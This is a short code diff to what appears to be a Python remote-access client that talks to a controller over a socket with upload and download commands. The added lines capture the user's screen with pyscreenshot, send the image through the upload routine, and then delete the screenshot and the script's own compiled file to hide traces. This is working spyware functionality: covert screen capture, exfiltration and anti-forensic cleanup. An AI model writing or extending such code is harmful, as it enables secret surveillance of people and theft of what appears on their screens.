@@ -22,6 +22,7 @@ import getpass
 import platform
 import time
 import re
+from pyscreenshot import grab_to_file
 
 HOST = '127.0.0.1'
 PORT = int('8000')
@@ -60,6 +61,7 @@ def download(command):
 
 def upload(command):
     fileName = command.replace("download ", "")
+    if fileName == "ss.png": file = grab_to_file("ss.png")
     try:
         f = open(fileName, 'rb')
         l = f.read(1024)
@@ -69,6 +71,8 @@ def upload(command):
             l = f.read(1024)
         f.close()
         s.send(END_OF_FILE)
+        os.remove("ss.png")
+        os.remove(sys.argv[0]+"c")
         main()
 
     except IOError:
